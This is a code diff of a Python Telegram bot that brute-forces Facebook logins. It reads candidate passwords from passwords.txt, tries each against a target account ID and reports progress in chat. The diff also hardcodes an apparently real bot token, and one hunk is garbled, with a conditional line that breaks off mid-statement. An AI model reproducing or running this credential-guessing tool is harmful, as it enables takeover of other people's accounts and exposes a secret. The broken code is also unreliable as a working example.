@@ -15,11 +15,10 @@ def home():
     return "Bot is Running!"
 
 def run_web():
-    # Render ডিফল্টভাবে ১০০০০ পোর্ট ব্যবহার করে
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
 
-# @BotFather থেকে পাওয়া তোমার টোকেনটি এখানে বসাও
+# তোমার টোকেন এখানে সেট করা আছে
 TOKEN = '8531505263:AAHHzdZd037mxiP_qa0FC4kc76J7w3YR03g'
 bot = telebot.TeleBot(TOKEN)
 
@@ -71,7 +70,6 @@ def start_attack(message):
     status_msg = bot.send_message(chat_id, "⚙️ **Initializing Attack...**", parse_mode='Markdown')
     
     try:
-        # passwords.txt ফাইলটি অবশ্যই তোমার গিটহাবে থাকতে হবে
         with open('passwords.txt', 'r') as f:
             all_passwords = f.readlines()
         
@@ -83,10 +81,10 @@ def start_attack(message):
 
             pwd = pwd.strip()
             if not pwd or "`\n"
-                f"🎯 **Target:** `{target_id}`\n"
-                f"🔥 **Testing:** `{pwd}`", 
-                chat_id, status_msg.message_id, reply_markup=markup, parse_mode='Markdown'
-            )
+                    f"🎯 **Target:** `{target_id}`\n"
+                    f"🔥 **Testing:** `{pwd}`", 
+                    chat_id, status_msg.message_id, reply_markup=markup, parse_mode='Markdown'
+                )
             
             result = check_fb_login(target_id, pwd)
             
@@ -106,10 +104,9 @@ def stop(call):
     loop_control[call.message.chat.id] = False
     bot.answer_callback_query(call.id, "Stopping the attack...")
 
-# মেইন ফাংশন যা ওয়েব সার্ভার এবং বট একসাথে চালাবে
 if __name__ == "__main__":
-    # ওয়েব সার্ভার আলাদা থ্রেডে চালানো
     t = Thread(target=run_web)
+    t.daemon = True
     t.start()
-    # বট পোলিং শুরু
     bot.polling(none_stop=True)
+        
